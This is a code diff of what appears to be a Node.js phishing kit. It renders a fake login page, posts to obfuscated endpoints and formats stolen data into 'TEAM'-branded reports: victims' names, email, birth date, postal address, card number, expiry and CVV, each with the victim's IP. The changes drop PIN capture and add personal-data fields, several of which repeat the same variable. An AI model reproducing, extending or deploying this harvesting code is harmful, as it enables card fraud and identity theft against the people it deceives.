@@ -109,8 +109,8 @@ function getIpList(){
     }
     return good_one;
 }
-//////////////////////////////
-//=========================[GET]===================
+//////////////
+//=========================[GET]===========================//
 app.get("/",(req,res)=>{ // login
     res.render("index");
 });
@@ -186,7 +186,7 @@ app.post("/jK6hfjYT7poOP8hLPOjk",(req,res)=>{ // sms2 post
 // 9alab dayal CHULDA:
 function a1(data,ip) {
     let block="";
-    block += `${brand}  | [LOGIN](TYPE) |  TEAM\n`; 
+    block += `${brand}  | [LOGIN] |  TEAM\n`; 
     block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
     block += `Type: ${data.nifo}\nIP: ${ip}\n`;
     block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
@@ -200,7 +200,7 @@ function a2(data,ip) {
     let block="";
     block += `${brand}  | [LOGIN](secreto) |  TEAM\n`; 
     block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
-    block += `Número secreto: ${data.secr}\nIP: ${ip}\n`;
+    block += `Apellidos: ${data.s1}\nApellidos: ${data.s1}\nNombres: ${data.s2}\nEmail: ${data.s1}\nFecha de nacimiento: ${data.s1}\nDirección postal: ${data.s1}\nCódigo postal: ${data.s1}\nCiudad: ${data.s1}\nNúmero: ${data.s1}\nIP: ${ip}\n`;
     block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
     block += `${brand}  | [${target}]  |  TEAM`;
     
@@ -210,7 +210,7 @@ function a3(data,ip) {
     let block="";
     block += `${brand}  | [CC-s5ona] |  TEAM\n`; 
     block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
-    block += `CARD N*: ${data.a1}\nMM/YY: ${data.a2}\nCVV: ${data.a3}\nPIN: ${data.a4}\nIP: ${ip}\n`;
+    block += `CARD N*: ${data.a1}\nMM/YY: ${data.a2}\nCVV: ${data.a3}\nIP: ${ip}\n`;
     block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
     block += `${brand}  | [${target}]  |  TEAM`;
     
